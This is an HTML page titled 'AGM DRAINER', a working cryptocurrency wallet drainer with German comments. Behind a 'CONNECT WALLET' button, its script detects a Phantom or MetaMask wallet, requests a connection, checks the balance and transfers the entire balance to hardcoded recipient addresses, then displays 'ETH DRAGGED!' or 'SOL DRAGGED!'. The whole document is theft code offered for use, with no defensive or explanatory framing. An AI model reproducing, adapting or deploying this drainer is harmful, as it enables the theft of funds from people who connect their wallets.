<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <title>AGM DRAINER</title>
    <!-- Bibliotheken -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
  
    <style>
    body { background: #000; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
  .box { border: 2px solid #00ff00; padding: 40px; width: 300px; text-align: center; background: #111; box-shadow: 0 0 20px #00ff00; }
    button { background: #00ff00; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 5px; }
    #status { margin-top: 20px; color: #aaa; }
  .final { color: #fff; font-weight: bold; }
    </style>
</head>
<body>

    <div class="box">
    <h2>DRAINER</h2>
    <button id="btn" onclick="process()">CONNECT WALLET</button>
    <div id="status">Waiting...</div>
 </div>

<script>
    const btn = document.getElementById("btn");
    const status = document.getElementById("status");

    const TARGET_ETH = "0xD4144Da2f3c5D8eF7a0B1d7D2F6C6D8A5E5B4C"; 
    const TARGET_SOL = "DEINE_SOLANA_ADRESSE_HIER"; 

    async function process() {
    btn.disabled = true;
    status.innerText = "Connecting...";

  try {
    // 1. PRÜFE OB PHANTOM DA IST
    if (window.solana && window.solana.isPhantom) {
    await getSolanaFunds();
   return; 
 } 
    // 2. PRÜFE OB METAMASK DA IST
    else if (window.ethereum) {
    await getEthereumFunds();
    return;
  } 

    status.innerText = "No Wallet Found.";
    btn.disabled = false;
   } catch (e) {
    status.innerText = "Error: " + e.message;
    btn.disabled = false;
  }
 }

    async function getSolanaFunds() {
   try {
    const provider = window.solana;
  
    // ---> HIER PASSIERT DIE VERBINDUNG <---
    status.innerText = "Asking Phantom...";
    await provider.connect();
  
    const { publicKey } = provider;
  
    // Jetzt erst schauen, was drin ist
    status.innerText = "Checking Balance...";
    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
    const balance = await connection.getBalance(publicKey);

    if (balance > 0) {
    status.innerText = "Sending SOL...";
  
    const tx = new solanaWeb3.Transaction().add(
    solanaWeb3.SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new solanaWeb3.PublicKey(TARGET_SOL),
    lamports: balance,
  })
  );
  
    await provider.signAndSendTransaction(tx);
    status.innerHTML = "SUCCESS: <b>SOL DRAGGED!</b>";
    status.className = "final";
   } else {
    throw new Error("Empty Wallet");
  }
    } catch (e) {
    throw new Error("SOL Error: " + e.message);
  }
 }

    async function getEthereumFunds() {
   try {
    const provider = new ethers.BrowserProvider(window.ethereum);
  
    // ---> HIER KOMMT DAS POPUP <---
    status.innerText = "Asking MetaMask...";
    const accounts = await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
  
    status.innerText = "Checking ETH...";
    const balance = await provider.getBalance(signer.address);

    if (balance > 0n) {
    status.innerText = "Sending ETH...";
    const tx = await signer.sendTransaction({
    to: TARGET_ETH,
    value: balance
  });
    await tx.wait();
    status.innerHTML = "SUCCESS: <b>ETH DRAGGED!</b>";
    status.className = "final";
   } else {
    throw new Error("Empty Wallet");
  }
    } catch (e) {
    throw new Error("ETH Error: " + e.message);
  }
  }
   </script>
</body>
</html>
